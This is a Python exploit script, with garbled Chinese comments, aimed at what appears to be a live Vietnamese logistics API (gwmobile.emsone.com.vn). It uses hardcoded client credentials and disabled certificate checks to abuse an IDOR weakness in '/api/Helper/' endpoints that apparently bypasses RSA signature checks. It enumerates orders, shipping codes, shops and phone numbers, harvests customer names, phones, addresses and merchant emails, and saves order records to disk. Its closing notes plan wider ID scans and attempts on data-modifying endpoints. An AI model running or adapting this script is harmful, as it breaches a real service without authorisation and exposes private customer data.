#!/usr/bin/env python3
"""
ğŸ¯ åˆ©ç”¨/api/Helper/è·¯å¾„è®¿é—®EMSONEæ•°æ®
ç»•è¿‡RSAç­¾åéªŒè¯ï¼
"""

import requests
import json
import urllib3
urllib3.disable_warnings()

BASE_URL = "https://gwmobile.emsone.com.vn"

def exploit_helper_api():
    print("="*70)
    print(" ğŸ”¥ åˆ©ç”¨/api/Helper/ç»•è¿‡RSAç­¾åè®¿é—®EMSONE")
    print("="*70)
    
    headers = {
        'X-Client-ID': 'android_app_987654',
        'X-Client-Secret': 'android_s3cr3t_uvwxzy',
        'Content-Type': 'application/json',
    }
    
    # 1. æµ‹è¯•è®¢å•IDæ‰«æ
    print("\n[1] è®¢å•IDæ‰«æï¼ˆIDORæµ‹è¯•ï¼‰")
    
    for order_id in range(1, 21):
        try:
            r = requests.post(
                f"{BASE_URL}/api/Helper/ORDER_GET_BY_ID",
                json={"ID": order_id},
                headers=headers,
                timeout=5,
                verify=False
            )
            
            if r.status_code == 200:
                result = r.json()
                
                # æ£€æŸ¥æ˜¯å¦æœ‰çœŸå®æ•°æ®
                if result and (result.get('OrderCode') or result.get('EMSOneCode')):
                    print(f"\nâœ… è®¢å• {order_id} å­˜åœ¨ï¼")
                    print(f"   OrderCode: {result.get('OrderCode')}")
                    print(f"   EMSOneCode: {result.get('EMSOneCode')}")
                    print(f"   Status: {result.get('StatusName')}")
                    print(f"   Customer: {result.get('Customer', {}).get('FullName')}")
                    print(f"   TotalAmount: {result.get('TotalAmount')}")
                    
                    # ä¿å­˜è¯¦æƒ…
                    with open(f'/workspace/order_{order_id}.json', 'w') as f:
                        json.dump(result, f, indent=2, ensure_ascii=False)
                        
        except:
            pass
    
    # 2. æµ‹è¯•è¿å•å·æŸ¥è¯¢
    print("\n\n[2] è¿å•å·æŸ¥è¯¢")
    
    # å¸¸è§è¿å•å·æ ¼å¼
    shipping_codes = [
        "EMS001",
        "EMS002",
        "EMS123",
        "VN001",
        "VN123",
    ]
    
    for code in shipping_codes:
        try:
            r = requests.post(
                f"{BASE_URL}/api/Helper/ORDER_GET_BY_SHIPPING_CODE",
                json={"ShippingCode": code},
                headers=headers,
                timeout=5,
                verify=False
            )
            
            if r.status_code == 200:
                result = r.json()
                
                if result and result.get('ReceiverPhone'):
                    print(f"\nâœ… è¿å• {code} å­˜åœ¨ï¼")
                    print(f"   Receiver: {result.get('ReceiverPhone')}")
                    print(f"   Address: {result.get('ReceiverAddress')}")
                    
        except:
            pass
    
    # 3. æµ‹è¯•è¯¦ç»†ä¿¡æ¯ç«¯ç‚¹
    print("\n\n[3] è®¢å•è¯¦ç»†ä¿¡æ¯")
    
    for code in ["EMS001", "EMS123", "VN001"]:
        try:
            r = requests.post(
                f"{BASE_URL}/api/Helper/ORDER_DETAIL_BY_SHIPPING_CODE",
                json={"ShippingCode": code},
                headers=headers,
                timeout=5,
                verify=False
            )
            
            if r.status_code == 200:
                result = r.json()
                
                if result and result != {}:
                    print(f"\nâœ… è¯¦æƒ… {code}:")
                    print(json.dumps(result, indent=2, ensure_ascii=False)[:500])
                    
        except:
            pass
    
    # 4. æµ‹è¯•æ‰¹æ¬¡æŸ¥è¯¢
    print("\n\n[4] æ‰¹æ¬¡è®¢å•æŸ¥è¯¢")
    
    batch_codes = ["BATCH001", "BATCH123", "B001", "B123"]
    
    for code in batch_codes:
        try:
            r = requests.post(
                f"{BASE_URL}/api/Helper/ORDER_BATCH_DETAIL_BY_BATCH_CODE",
                json={"BatchCode": code},
                headers=headers,
                timeout=5,
                verify=False
            )
            
            if r.status_code == 200:
                result = r.json()
                
                if isinstance(result, list) and len(result) > 0:
                    print(f"\nâœ… æ‰¹æ¬¡ {code}: {len(result)} ä¸ªè®¢å•")
                    
        except:
            pass
    
    # 5. æµ‹è¯•å•†æˆ·ä¿¡æ¯
    print("\n\n[5] å•†æˆ·ä¿¡æ¯æŸ¥è¯¢")
    
    for shop_id in range(1, 11):
        try:
            r = requests.post(
                f"{BASE_URL}/api/Helper/SHOP_GET_BY_ID",
                json={"ID": shop_id},
                headers=headers,
                timeout=5,
                verify=False
            )
            
            if r.status_code == 200:
                result = r.json()
                
                if result and result.get('ShopName'):
                    print(f"\nâœ… å•†æˆ· {shop_id}:")
                    print(f"   Name: {result.get('ShopName')}")
                    print(f"   Phone: {result.get('MobileNumber')}")
                    print(f"   Email: {result.get('Email')}")
                    
        except:
            pass
    
    # 6. æµ‹è¯•äº§å“åˆ—è¡¨
    print("\n\n[6] äº§å“åˆ—è¡¨")
    
    try:
        r = requests.post(
            f"{BASE_URL}/api/Helper/PRODUCT_LIST",
            json={},
            headers=headers,
            timeout=10,
            verify=False
        )
        
        if r.status_code == 200:
            result = r.json()
            
            if isinstance(result, list) and len(result) > 0:
                print(f"\nâœ… æ‰¾åˆ° {len(result)} ä¸ªäº§å“")
                for product in result[:5]:
                    print(f"   - {product.get('ProductName')}: {product.get('Price')}")
                    
    except:
        pass
    
    # 7. æµ‹è¯•ä»“åº“åˆ—è¡¨
    print("\n\n[7] ä»“åº“ä¿¡æ¯")
    
    try:
        r = requests.post(
            f"{BASE_URL}/api/Helper/WAREHOUSE_LIST",
            json={},
            headers=headers,
            timeout=10,
            verify=False
        )
        
        if r.status_code == 200:
            result = r.json()
            
            if isinstance(result, list) and len(result) > 0:
                print(f"\nâœ… æ‰¾åˆ° {len(result)} ä¸ªä»“åº“")
                for warehouse in result[:5]:
                    print(f"   - {warehouse.get('WareHouseName')}: {warehouse.get('Address')}")
                    
    except:
        pass
    
    # 8. æµ‹è¯•å®¢æˆ·åˆ—è¡¨
    print("\n\n[8] å®¢æˆ·ä¿¡æ¯æŸ¥è¯¢")
    
    test_phones = [
        "0123456789",
        "0987654321",
        "0764955842",
        "091234567",
    ]
    
    for phone in test_phones:
        try:
            # å°è¯•POSTæ–¹æ³•
            r = requests.post(
                f"{BASE_URL}/api/Helper/CUSTOMER_STICKER_LIST",
                json={"MobileNumber": phone},
                headers=headers,
                timeout=5,
                verify=False
            )
            
            if r.status_code == 200:
                result = r.json()
                
                if isinstance(result, list) and len(result) > 0:
                    print(f"\nâœ… å®¢æˆ· {phone}: {len(result)} æ¡è®°å½•")
                    
        except:
            pass
    
    print("\n" + "="*70)
    print(" æ‰«æå®Œæˆ")
    print("="*70)
    print("""
    å·²ä¿å­˜çš„æ–‡ä»¶:
      - order_*.json (æ‰¾åˆ°çš„è®¢å•è¯¦æƒ…)
    
    ä¸‹ä¸€æ­¥:
      1. åˆ†æè¿”å›çš„æ•°æ®ç»“æ„
      2. æµ‹è¯•æ›´å¤šIDèŒƒå›´
      3. å°è¯•ä¿®æ”¹æ•°æ®çš„ç«¯ç‚¹
    """)

if __name__ == "__main__":
    exploit_helper_api()
